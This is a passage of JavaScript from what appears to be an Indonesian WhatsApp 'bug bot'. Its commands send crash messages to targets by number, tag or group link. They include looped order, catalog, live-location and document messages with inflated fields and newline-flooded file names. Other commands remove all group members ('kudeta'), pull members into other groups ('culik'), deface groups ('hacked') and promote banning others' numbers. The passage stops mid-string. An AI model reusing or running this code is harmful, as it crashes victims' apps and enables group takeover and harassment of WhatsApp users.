require("../basetzy/sendbug/bagian1/sendbug")(zyren, setReply, text, sleep, prefix, ngazap, fkontak, notif3, notif4, place)
}
break
case "sendbugv":
if (!isCreator) return onlyOwner()
if (!Input) return setReply("Reply pesan/Tag orang/Nomer")
if (mentionByReply) {
require("../basetzy/sendbug/bagian2/indexByReply")(zyren, m, prefix, command, mentionByReply)
} else if (mentionByTag[0] && m.isGroup) {
require("../basetzy/sendbug/bagian2/indexByTag")(zyren, m, prefix, command, mentionByTag)
} else if (text.split("|")[0] && !text.split("|")[1] && !text.split("|")[2]) {
require("../basetzy/sendbug/bagian2/indexByNumber")(zyren, m, prefix, command, text)
} else if (text.split("|")[0] && text.split("|")[1] && !text.split("|")[2]) {
require("../basetzy/sendbug/bagian2/jumlah")(zyren, m, prefix, command, text)
} else if (text.split("|")[0] && text.split("|")[1] && text.split("|")[2]) {
require("../basetzy/sendbug/bagian2/sendbug")(zyren, setReply, text, sleep, prefix, ngazap, fkontak, notif3, notif4, place)
}
break
case "sendbuggc":
if (!isCreator) return onlyOwner()
if (!text) return setReply("Masukkan Link Group!")
if (text.split("|")[0] && !text.split("|")[1]) {
if (!text.split("|")[0].includes("https://chat.whatsapp.com/")) return setReply("Itu bukan link group")
require("../basetzy/sendbug/bagian1/indexLink")(zyren, m, prefix, command, text)
} else if (text.split("|")[0] && text.split("|")[1]) {
require("../basetzy/sendbug/bagian1/sendbugGc")(zyren, setReply, text, sleep, prefix, ngazap, fkontak, notif3, notif4, place)
}
break
case "sendbuggcv":
if (!isCreator) return onlyOwner()
if (!text) return setReply("Masukkan Link Group!")
if (text.split("|")[0] && !text.split("|")[1] && !text.split("|")[2]) {
if (!text.split("|")[0].includes("https://chat.whatsapp.com/")) return setReply("Itu bukan link group")
require("../basetzy/sendbug/bagian2/indexLink")(zyren, m, prefix, command, text)
} else if (text.split("|")[0] && text.split("|")[1] && !text.split("|")[2]) {
require("../basetzy/sendbug/bagian2/jumlah")(zyren, m, prefix, command, text)
} else if (text.split("|")[0] && text.split("|")[1] && text.split("|")[2]) {
require("../basetzy/sendbug/bagian2/sendbugGc")(zyren, setReply, text, sleep, prefix, ngazap, fkontak, notif3, notif4, place)
}
break
case "bugdelete":
if (!isCreator) return onlyOwner()
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
zyren.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.id, participant: "0️" } })
break
case "kudeta":{
if (!isCreator) return onlyOwner()
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
let data = participants.map((x) => x.id)
for (let x of data) {
if (x !== botNumber && x !== groupMetadata.owner && x !== ownerNumber + "@s.whatsapp.net") {
zyren.groupParticipantsUpdate(m.chat, [x], "remove")
await sleep(1000) 
}}}
break
case "culikall":{
if (!isCreator) return onlyOwner()
if (!m.isGroup) return onlyGroup()
if (!text) return setReply("Link?")
if (!text.includes("https://chat.whatsapp.com/")) return setReply("Itu Bukan Link Group Kak")
let member = participants.map((x) => x.id)
let ano = text.split("https://chat.whatsapp.com/")[1]
let nana = await zyren.groupAcceptInvite(ano)
const groupMet = await zyren.groupMetadata(nana).catch(e => {})
const parti = await groupMet.participants
const groupAdm = await parti.filter(v => v.admin !== null).map(v => v.id)
if (!groupAdm.includes(botNumber)) return onlyBadmin()
await zyren.groupParticipantsUpdate(nana, member, "add")
setReply("Berhasil Menculik Member") 
}
break 
case "culik":{
if (!isCreator) return onlyOwner()
if (!m.isGroup) return onlyGroup()
if (mentionByReply) {
if (!text) return setReply("Link?")
if (!text.includes("https://chat.whatsapp.com/")) return setReply("Itu Bukan Link Group Kak")
let ano = text.split("https://chat.whatsapp.com/")[1]
let nana = await zyren.groupAcceptInvite(ano)
const groupMet = await zyren.groupMetadata(nana).catch(e => {})
const parti = await groupMet.participants
const groupAdm = await parti.filter(v => v.admin !== null).map(v => v.id)
if (!groupAdm.includes(botNumber)) return onlyBadmin()
await zyren.groupParticipantsUpdate(nana, [mentionByReply], "add")
setReply("Berhasil Menculik Member") 
} else if (text.includes("@")) {
if (!text.split(",")[0]) return setReply("pake koma buat pembatas")
db.data.chats[m.chat].culik = {
status: true, 
penculik: m.sender, 
member: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net")
}
setReply("Sukses sekarang masukan link gc") 
} else {
if (!text) return setReply("Link?")
if (!text.includes("https://chat.whatsapp.com/")) return setReply("Itu Bukan Link Group Kak")
let member = participants.map((x) => x.id)
let ano = text.split("https://chat.whatsapp.com/")[1]
let nana = await zyren.groupAcceptInvite(ano)
const groupMet = await zyren.groupMetadata(nana).catch(e => {})
const parti = await groupMet.participants
const groupAdm = await parti.filter(v => v.admin !== null).map(v => v.id)
if (!groupAdm.includes(botNumber)) return onlyBadmin()
await zyren.groupParticipantsUpdate(nana, member, "add")
setReply("Berhasil Menculik Member") 
}
}
break 
case "hacked": {
if (!isCreator) return onlyOwner()
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
setReply("Waitt....")
let teks = `GRUP TELAH DIRETAS BY PAK TZY!!`
const { generateProfilePicture } = require("../basetzy/lib/myfunc")
const { img } = await generateProfilePicture("https://a.uguu.se/zRMfrPTW.jpg")
await zyren.query({ tag: "iq",  attrs: { to: m.chat, type:"set", xmlns: "w:profile:picture"}, content: [{ tag: "picture", attrs: { type: "image" }, content: img }]})
await zyren.groupUpdateSubject(m.chat, "THE GROUP HAS BEEN HACKED")
await zyren.groupUpdateDescription(m.chat, teks)
await setReply("Sukses Meretas Group...")
}
break
case "autobug":
if (!isCreator) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autobug.status == true) return setReply("Sudah aktif")
db.data.settings[botNumber].autobug = {
status: true, 
expired: Date.now() + toMs(timeBug + "m")
}
setReply("Sukses Mengaktifkan Auto Bug")
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autobug.status == false) return setReply("Sudah nonaktif")
db.data.settings[botNumber].autobug = {
status: false, 
expired: 0
}
setReply("Sukses Mematikan Auto bug")
} else {
zyren.sendButMessage(m.chat, `MODE AUTO BUG`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
case "autobugreact":
if (!isCreator) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (isAutoBugReact == true) return setReply("Sudah aktif")
db.data.chats[m.chat].autobugreact = true
setReply("Sukses mengaktifkan auto bug react")
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (isAutoBugReact == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].autobugreact = false
setReply("Sukses mematikan auto bug react")
} else {
zyren.sendButMessage(m.chat, `MODE AUTO BUG REACT`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
case "bug":{
if (!isCreator) return onlyOwner()
await zyren.sendMessage(from,{text:"Hai"},{quoted:{
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `Kok Fc?`, 
"jpegThumbnail": thumb
}
}
}})
}
break
//=================================================//
case "inibug": {
if (!isCreator) return onlyOwner()
let teks = `══✪〘 *BANG INI BUG ? ☺️* 〙✪══
 ➲ *Pesan : ${q ? q : "kosong"}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split("@")[0]}\n`
}
zyren.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
}
break
case "bugpc": {
if (!isCreator) return onlyOwner()
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `${ngazap(prefix)}`,
						"groupName": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
						"caption": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
zyren.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
break
case "troli": {
if (!isCreator) return onlyOwner()
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "594071395007984",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${notif3}`,
"jpegThumbnail":fs.readFileSync("./media/gambarnye/thezyren.jpg"),
"orderTitle": `${notif4}`,
"sellerJid": "6281991410940@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: trol })
zyren.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
case "catalog": {
if (!isCreator) return onlyOwner()
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
"description": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
"currencyCode": "IDR",
"footerText": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
"priceAmount1000": "10000000",
"productImageCount": 923456789,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
"url": "wa.me/6281991410940"
},
"businessOwnerJid": "6281991410940@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ftrolii })
zyren.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case "bannum": {
if (isBan) throw sticBanLu(from)
const templateButtons = [
{index: 1, urlButton: {displayText: '𝙱𝙰𝙽 𝙽𝚄𝙼𝙱𝙴𝚁', url: linkpro}}
]
const templateMessage = {
video: thumbnailvid,
gifPlayback:true,
jpegThumbnail: logonya,
caption: `
◎ Lib : Multi-Device
◎ Terbit : *18-07-2022*
◎ Owner : 081991410940

🇲🇨 *Click Ban Number Untuk Banned Nomor Whatsapp Orang !!*`,
footer: '𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘',
templateButtons: templateButtons
}
zyren.sendMessage(m.chat, templateMessage)
}
break
//========================BUG BY XINN=========================//
case "unbannum": {
if (isBan) throw sticBanLu(from)
const templateButtons = [
{index: 1, urlButton: {displayText: '𝚄𝙽𝙱𝙰𝙽 𝙽𝚄𝙼𝙱𝙴𝚁', url: linkun}}
]
const templateMessage = {
video: thumbnailvid,
gifPlayback:true,
jpegThumbnail: logonya,
caption: `
◎ Lib : Multi-Device
◎ Terbit : *18-07-2022*
◎ Owner : 081991410940

🇲🇨 *Click Unban Number Untuk Meng Unban Akun Yg Terkunci !!*`,
footer: '𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘',
templateButtons: templateButtons
}
zyren.sendMessage(m.chat, templateMessage)
}
break
case "livelok": {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1] 
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: ftrolii })
zyren.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
setReply(tekteka)
}
break
//=================================================//
case "lokas": {
if (!isCreator) return onlyOwner()
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: ftrolii })
zyren.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
//=================================================//
case "catalog2": {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
"description": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
"currencyCode": "IDR",
"footerText": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
"priceAmount1000": "10000000",
"productImageCount": 923456789,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
"url": "wa.me/6281991410940"
},
"businessOwnerJid": "6281991410940@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: trol})
zyren.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
setReply(tekteka)
}
break
//=================================================//
/*BUG WACAP */
case "catalog3": {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `${cttl}`,
"description": `${cttl}`,
"bodyText": `${bd}${buttonvirus}`,
"footerText": `${ft}`,
"productImageCount": 923456789,
"firstImageId": 1,
"retailerId": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
"url": "wa.me/6281991410940"
},
"businessOwnerJid": "6281991410940@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: trol  })
zyren.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
setReply(tekteka)
}
break
//=================================================//
/*BUG WACAP */
case "poll": {
if (!isCreator) return onlyOwner()
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
						"name": "HALO 👋 SAYA BOT NVS",
						"options": [
							{
								"optionName": "KATANYA WA KEBAL"
							},
							{
								"optionName": "BERANI VOTE GA"
							},
							{
								"optionName": "VOTE LAH SEMUA"
							},
							{
								"optionName": "KATANYA KEBAL"
							},
							{
								"optionName": "🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   "
							}
						],
						"selectableOptionsCount": 5
					}
}), { userJid: m.chat, quoted: doc })
zyren.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
setReply("Sukses Sendbug")
}
break
case "votpol": {
if (!isCreator) return onlyOwner()
let jansencoli = {key : {participant : "0@s.whatsapp.net"},message: {documentMessage: {title: `${ownerName}`,jpegThumbnail: thumb}}}
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO SAYA BOT NVS",
"options": [
	{
"optionName": "VOTE YUK"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "BIAR DAPAT WA VIP"
	},
	{
"optionName": "SALAM CREATOR BOT"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: jansencoli })
zyren.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
}
break
case "polvote": {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} Teks\nExample : ${command} Pak Tzy\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
let jansencoli = {key : {participant : "0@s.whatsapp.net"},message: {documentMessage: {title: `${ownerName}`,jpegThumbnail: thumb}}}
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "🍷꙰͜͡𝐏𝐚𝐤𝐓𝐳𝐲💸̷⃨⃛",
"options": [
	{
"optionName": `${q} SLEBEWW🥶`
	},
	{
"optionName": `${q} MODDER☄️`
	},
	{
"optionName": "WHATSAPP VIP🔱"
	},
	{
"optionName": `${q} COLL🥶`
	},
	{
"optionName": `${q} ATTACKER🌀`
	},
	{
"optionName": `${q} INFINTY㊙️`
	},
	{
"optionName": `${q} MASTAHH♨️`
	},
	{
"optionName": "USD 💱"
	},
	{
"optionName": `THE ${q}☣️️`
	},
	{
"optionName": "Pak Tzy No Counter🚭"
	}
],
"selectableOptionsCount": 10
	}
}), { userJid: m.chat, quoted: jansencoli })
zyren.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
}
break
case "troli2": {
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Zyren`
for (let i = 0; i < jumlah; i++) {
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "449756950375071",
"itemCount": 99999999999,	
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© PAK TZY 英 俊${ngazap(prefix)}`,
"jpegThumbnail": logonya,
"orderTitle": `© PAK TZY 英 俊${ngazap(prefix)}`,
"sellerJid": "6281991410940@s.whatsapp.net",
"token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",	
}
}), { userJid: m.chat, quoted: doc })
zyren.relayMessage(m.chat, order.message, { messageId: order.key.id })
}}
break
case "docu": {
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Zyren`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🍻ิ҈࿆ۣ𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘ꪶ♘ꫂ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${place}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
zyren.relayMessage(m.chat, document.message, { messageId: document.key.id })
}}
break
case "doc": {
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Zyren`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `𝐏𝐚𝐤𝐓𝐳𝐲 英 俊\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttontzy}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
zyren.relayMessage(m.chat, document.message, { messageId: document.key.id })
}}
break
case "virduc": {
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Zyren`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `‍📄 𝐏𝐚𝐤𝐓𝐳𝐲
